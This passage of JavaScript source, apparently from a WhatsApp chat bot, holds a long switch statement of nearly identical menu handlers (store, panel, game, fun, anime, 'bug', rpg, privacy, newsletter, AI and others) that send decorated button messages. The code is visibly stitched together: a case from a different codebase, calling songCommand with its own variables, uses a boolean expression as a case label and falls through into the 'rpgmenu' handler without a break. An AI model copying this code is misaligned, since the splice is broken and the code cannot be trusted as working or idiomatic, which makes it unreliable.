let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${convertMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'storemenu':
case 'stmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${storeMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'panelmenu':
case 'pmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${panelMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'gamemenu':
case 'gmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${gameMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'funmenu':
case 'fmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${funMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'randomanimemenu':
case 'ramenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${randomAnimeMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'bugmenu':
case 'bgmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${bugMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;
case userMessage.startsWith('.play2') || userMessage.startsWith('.mp3') || userMessage.startsWith('.ytmp3') || userMessage.startsWith('.song2'):
                await songCommand(sock, chatId, message);
                case 'rpgmenu':
case 'rmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${rpgMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'privacymenu':
case 'prmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${privacyMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'newslettermenu':
case 'newmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${newsletterMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'aimenu':
case 'aimnu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${aiMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: footer,
highlight_label: ownerName,
rows: [
{ title: "📚 All Menus", description: "See all available features!", id: `${prefix}allmenu` },
{ title: "🎀 Main Menu", description: "See info about the bot system!", id: `${prefix}menu` },
{ title: "👑 My Owner", description: "Contact the owner's number here!", id: `${prefix}owner` },
{ title: "📜 Get Script", description: "Get this bot's script!", id: `${prefix}script` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'othermenu':
case 'othmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${otherMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'slot': {
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');	
await gameSlot(sock, m, db.data.users);
}
break;

case 'casino': {
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
